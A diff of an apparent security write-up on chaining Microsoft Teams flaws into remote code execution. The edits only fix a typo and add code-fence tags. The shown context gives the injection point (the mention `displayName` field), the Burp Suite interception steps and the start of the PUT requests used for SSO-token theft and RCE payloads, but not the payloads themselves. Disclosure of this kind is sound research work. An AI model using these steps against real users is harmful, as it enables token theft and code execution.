@@ -159,12 +159,12 @@ To achieve RCE in Microsoft Teams, two vulnerabilities are chained:
 
 2. Edit the chat message containing the mention and intercept with a HTTP proxy like Burp Suite
 
-In mention functionality, the vulnerable paramterer is `displayName` within the `{ content: "...", properties: { "mentions" : "[{ displayName: PAYLOAD HERE }]"` JSON message structure. 
+In mention functionality, the vulnerable parameter is `displayName` within the `{ content: "...", properties: { "mentions" : "[{ displayName: PAYLOAD HERE }]"` JSON message structure. 
 
 
 The request should look something like this, note `displayName`:
 
-```
+```http
 PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1
 Host: emea.ng.msg.teams.microsoft.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -194,7 +194,7 @@ To access user's local storage and all SSO tokens, use this payload within `disp
 ```
 
 Full HTTP request for SSO token logging:
-```
+```http
 PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1
 Host: emea.ng.msg.teams.microsoft.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -247,7 +247,7 @@ Shortened version for HTTP PUT request and improved to execute only once per rel
 ```
 
 Full HTTP PUT request with RCE payload:
-```
+```http
 PUT /v1/users/ME/conversations/19%3A9bc6400d2fc7443487491898c6803e46%40thread.tacv2/messages/1598607494949 HTTP/1.1
 Host: emea.ng.msg.teams.microsoft.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
